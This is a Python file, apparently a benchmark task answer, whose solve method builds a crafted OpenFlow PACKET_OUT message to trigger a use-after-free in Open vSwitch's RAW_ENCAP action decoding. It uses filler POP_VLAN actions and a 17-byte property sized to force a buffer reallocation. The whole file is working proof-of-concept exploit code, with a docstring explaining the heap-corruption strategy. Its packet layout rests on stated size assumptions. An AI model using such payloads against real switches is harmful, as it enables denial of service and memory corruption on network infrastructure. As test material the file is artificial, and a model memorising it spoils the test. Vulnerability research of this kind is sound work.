import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a use-after-free in the decoding of RAW_ENCAP actions.
        When a property is decoded, the buffer holding decoded actions ('ofpacts')
        may be reallocated. The decoder, however, continues to use a stale pointer
        to the action structure within the old, freed buffer.

        To trigger this, we construct a message that causes the 'ofpacts' buffer
        to be nearly full, then add a RAW_ENCAP action whose property decoding
        triggers a reallocation.

        Assumptions based on typical Open vSwitch implementation:
        - The initial 'ofpacts' buffer size is 64 bytes.
        - The decoded size of a POP_VLAN action is 8 bytes.
        - The decoded size of a base NXAST_RAW_ENCAP action struct is 24 bytes.

        PoC Strategy:
        1.  Create a minimal OpenFlow message. The target length of 72 bytes suggests
            an 8-byte OpenFlow header followed by a 64-byte action block.
        2.  Fill the 'ofpacts' buffer partially with three POP_VLAN actions.
            - Used space: 3 * 8 = 24 bytes.
            - Remaining space: 64 - 24 = 40 bytes.
        3.  Add the NXAST_RAW_ENCAP action. Its base decoded struct is 24 bytes, which fits.
            - Used space: 24 (fillers) + 24 (encap base) = 48 bytes.
            - Remaining tailroom: 64 - 48 = 16 bytes.
        4.  Include a property within the RAW_ENCAP action that requires more than 16 bytes
            of storage. We use 17 bytes of data. When this property is decoded and added
            to the 'ofpacts' buffer, it will trigger a reallocation.
        5.  After the reallocation, the original pointer to the encap action is stale.
            Subsequent writes to it within the decoder will corrupt the heap,
            leading to a crash under ASan.
        """

        # Part 1: OpenFlow Header (8 bytes)
        # A minimal header is used to meet the 72-byte target length. The type is
        # set to OFPT_PACKET_OUT, a common message type for carrying actions.
        ofp_version = 4
        ofp_type = 13  # OFPT_PACKET_OUT
        ofp_length = 72
        ofp_xid = 0
        header = struct.pack('!BBHI', ofp_version, ofp_type, ofp_length, ofp_xid)

        # Part 2: Actions Block (64 bytes)

        # Filler actions: 3x OFPAT_POP_VLAN (8 bytes each, total 24 bytes)
        # These actions serve to fill the buffer to the desired level.
        pop_vlan_action = struct.pack('!HH', 18, 8) + b'\x00' * 4
        filler_actions = pop_vlan_action * 3

        # Malicious action: NXAST_RAW_ENCAP (40 bytes)
        # The on-wire length must be a multiple of 8. The content requires 33 bytes,
        # which rounds up to 40 bytes.
        action_type = 0xffff      # OFPAT_EXPERIMENTER
        action_len = 40
        vendor_id = 0x00002320  # NX_VENDOR_ID
        subtype = 37            # NXAST_RAW_ENCAP
        encap_header = struct.pack('!HHIH', action_type, action_len, vendor_id, subtype) + b'\x00' * 2

        # The property that triggers the reallocation.
        # Its data length (17) is chosen to be just larger than the available
        # tailroom (16).
        prop_type = 0
        prop_data_len = 17
        prop_len = 4 + prop_data_len  # Total length of the property TLV
        prop_data = b'\x41' * prop_data_len
        property_payload = struct.pack('!HH', prop_type, prop_len) + prop_data

        # Padding to align the action to an 8-byte boundary.
        padding_len = action_len - len(encap_header) - len(property_payload)
        padding = b'\x00' * padding_len

        malicious_action = encap_header + property_payload + padding

        actions = filler_actions + malicious_action
        poc = header + actions

        return poc
